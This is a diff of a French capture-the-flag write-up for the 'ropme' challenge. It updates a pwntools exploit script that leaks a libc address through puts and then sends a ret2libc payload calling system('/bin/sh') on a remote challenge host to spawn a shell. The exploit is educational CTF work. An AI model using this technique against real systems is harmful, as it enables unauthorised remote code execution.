@@ -380,22 +380,25 @@ Pour automatiser ces étapes j'ai développé un script python avec le module [p
 ```py
 from pwn import *
 
-HOST, PORT = '178.62.118.108', 30396 
+HOST, PORT = "167.99.87.34", 30721
 
-#p = process('./ropme', stdin=PTY)
+#p = process("./ropme", stdin=PTY)
 p = remote(HOST, PORT)
-elf = ELF('./ropme')
-libc = ELF('/usr/lib/libc.so.6')
+elf = ELF("./ropme")
+rop = ROP("./ropme")
+#libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
+libc = ELF("./libc6_2.23-0ubuntu10_amd64.so") # Discovered by the puts leaked with libc-database
 
-padding = b'A' * 72 # offset to overwrite RIP
-gadget = 0x4006d3 # pop rdi ; ret
-puts_plt = elf.plt['puts'] # 0x4004e0 (plt in GEF)
-puts_got = elf.got['puts'] # 0x601018 (got in GEF)
-addr_main = elf.symbols['main'] # 0x400626 (1st Address Prologue Main Function)
+padding = cyclic(72) # offset to overwrite RIP with a pattern cyclic (same as "A" * 72)
+gadget = (rop.find_gadget(["pop rdi", "ret"]))[0]  # 0x4006d3 pop rdi ; ret
+puts_plt = elf.plt["puts"] # 0x4004e0
+puts_got = elf.got["puts"] # 0x601018 (got in GEF)
+addr_main = elf.symbols["main"] # 0x400626 (1st Address Prologue Main Function)
 
-p.recvuntil('ROP me outside, how \'about dah?\n') # wait str to send pld
+p.recvuntil("ROP me outside, how \'about dah?\n") # wait str to send pld
 
-pld = b''
+# ret2plt + ret2main
+pld = b""
 pld += padding # buffer + overwrite RBP (8 octets)
 pld += p64(gadget) # 1 argument (pop rdi ; ret)
 pld += p64(puts_got) # to save addr puts of GOT in rdi register
@@ -403,31 +406,26 @@ pld += p64(puts_plt) # to print puts GOT
 pld += p64(addr_main) # ret2main
 p.sendline(pld) # send payload
 
-puts_leak = u64(p.recvline().strip().ljust(8, b'\x00')) # to get valid address
-log.info('Leaked libc addr puts : {}'.format(hex(puts_leak))) # print address puts leaked
+# Parse Addr
+puts_leak = u64(p.recvline().strip().ljust(8, b"\x00"))
+log.info("Leaked libc address puts : {}".format(hex(puts_leak)))
 
-libc_puts = 0x06f690
-libc_binsh = 0x18cd17
-libc_system = 0x045390
+libc_base = puts_leak - libc.symbols["puts"] # calculate address base libc
+addr_system = libc_base + libc.symbols["system"] # calculate difference between base and system function
+binsh = libc_base + next(libc.search(b"/bin/sh\x00")) - 64 # calculate difference between base and /bin/sh
 
-libc_base = puts_leak - libc_puts # calculate addr base libc
-log.info('libc base at ' + hex(libc_base))
+log.info("Libc base : " + hex(libc_base))
+log.info("System address : " + hex(addr_system))
+log.info("/bin/sh : " + hex(binsh))
 
-addr_system = libc_base + libc_system # calculate difference between base and system function
-
-binsh = libc_base + libc_binsh # calculate difference between base and /bin/sh
-
-log.info('System at ' + hex(addr_system))
-log.info('/bin/sh at ' + hex(binsh))
-
-p.recvuntil('ROP me outside, how \'about dah?\n') # wait str to send payload
-
-pld = b''
+# ret2libc
+pld = b""
 pld += padding # offset to go save RIP 
 pld += p64(gadget) # gadget to pass a parameter to called function (pop rdi ; ret)
 pld += p64(binsh) # parameter system
 pld += p64(addr_system) # system in libc leaked 
 
+p.recvuntil("ROP me outside, how \'about dah?\n") # wait str to send payload
 p.sendline(pld) # send payload 
 p.interactive() # spawn interactive shell
 
